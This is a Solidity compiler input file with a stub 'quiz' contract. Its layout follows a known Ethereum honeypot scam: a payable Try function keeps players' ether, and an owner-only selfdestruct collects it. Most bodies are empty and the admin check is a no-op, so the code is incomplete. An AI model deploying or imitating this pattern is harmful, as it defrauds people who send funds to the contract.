{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "contracts/quiz.sol": {
      "content": "\ncontract KIZ_Quiz\n{\n    function Try(string memory _response) public payable\n    {\n        \n    }\n\n    string public question;\n\n    bytes32 responseHash;\n    address owner;\n    \n    mapping (bytes32=>bool) admin;\n\n    function Start(string calldata _question, string calldata _response) public payable isAdmin{\n    }\n\n    function Stop() public payable isAdmin {\n        require(msg.sender == owner);\n        selfdestruct(msg.sender);\n    }\n\n    function New(string calldata _question, bytes32 _responseHash) public payable isAdmin {\n    }\n\n    constructor(bytes32[] memory admins) public {\n        owner = msg.sender;    \n    }\n\n    modifier isAdmin(){\n        _;\n    }\n    \n\n    fallback() external {}\n}"
    }
  }
}